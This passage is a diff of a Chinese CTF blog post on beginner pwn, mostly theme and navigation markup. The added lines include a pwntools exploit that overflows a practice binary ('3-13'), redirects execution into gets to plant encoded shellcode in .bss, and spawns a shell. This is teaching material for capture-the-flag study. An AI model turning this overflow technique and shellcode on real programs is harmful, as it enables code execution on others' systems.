class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+offset=116
+r=process(&quot;3-13&quot;)
+elf=ELF(&quot;3-13&quot;)
+bss=elf.bss()
+get=elf.symbols[&#39;gets&#39;]
+shell=&quot;\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c&quot;
+payload=&quot;A&quot;*offset+p32(get)+p32(bss)+p32(bss)
+r.sendline(payload)
+r.sendline(shell)
+r.sendline(&#39;/bin/sh&#39;)
+r.interactive()
+</code></pre>
 <h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a><br><a href="https://bbs.pediy.com/thread-212691.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-212691.htm</a><br><a href="http://blog.xiyoulinux.org/detail.jsp?id=1965" target="_blank" rel="noopener">http://blog.xiyoulinux.org/detail.jsp?id=1965</a><br><a href="http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html" target="_blank" rel="noopener">http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html</a><br><a href="https://blog.csdn.net/qq_29343201/article/details/51337025" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a><br><a href="http://www.91ri.org/14382.html" target="_blank" rel="noopener">http://www.91ri.org/14382.html</a></p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2018/07/08/WEB入门（四）/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>WEB入门（四）</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2018/07/06/WEB入门（三）/">
+                        <span>WEB入门（三）</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
     </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
 
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
+      </div>
+    
   </div>
-  
+</div>
+
+<!-- Custom -->
+
+
     
-<nav id="article-nav">
+  </main>
+
   
-    <a href="/2018/07/08/WEB入门（四）/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          WEB入门（四）
-        
-      </div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
     </a>
   
-  
-    <a href="/2018/07/06/WEB入门（三）/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">WEB入门（三）</div>
-    </a>
-  
-</nav>
 
   
-</article>
-
-<!-- Table of Contents -->
-
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于-PWN-底层的原理"><span class="nav-number">1.</span> <span class="nav-text">关于 PWN 底层的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈帧平衡"><span class="nav-number">1.1.</span> <span class="nav-text">栈帧平衡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用函数（Call）"><span class="nav-number">1.2.</span> <span class="nav-text">调用函数（Call）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#返回值（Ret）"><span class="nav-number">1.3.</span> <span class="nav-text">返回值（Ret）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出（Buffer-Overflow）"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出（Buffer Overflow）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-下的-Pwn-常用命令"><span class="nav-number">3.</span> <span class="nav-text">Linux 下的 Pwn 常用命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-下的-Pwn-常用到的工具"><span class="nav-number">4.</span> <span class="nav-text">Linux 下的 Pwn 常用到的工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb-基本命令"><span class="nav-number">5.</span> <span class="nav-text">gdb 基本命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwntools-基本函数"><span class="nav-number">6.</span> <span class="nav-text">Pwntools 基本函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn-的小练习"><span class="nav-number">7.</span> <span class="nav-text">Pwn 的小练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#p1"><span class="nav-number">7.1.</span> <span class="nav-text">p1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#直接覆盖返回地址"><span class="nav-number">7.1.1.</span> <span class="nav-text">直接覆盖返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ret-slide"><span class="nav-number">7.1.2.</span> <span class="nav-text">Ret_slide</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-13"><span class="nav-number">7.2.</span> <span class="nav-text">3-13</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">8.</span> <span class="nav-text">参考网站</span></a></li></ol>
-    
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </aside>
+  </div>
+</div>
+  
 
-</section>
-        
-      </div>
+  
 
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
     </div>
-    <!-- <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
-  
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
-      </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
-      </div>
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PWN入门（二）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -595,5 +775,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
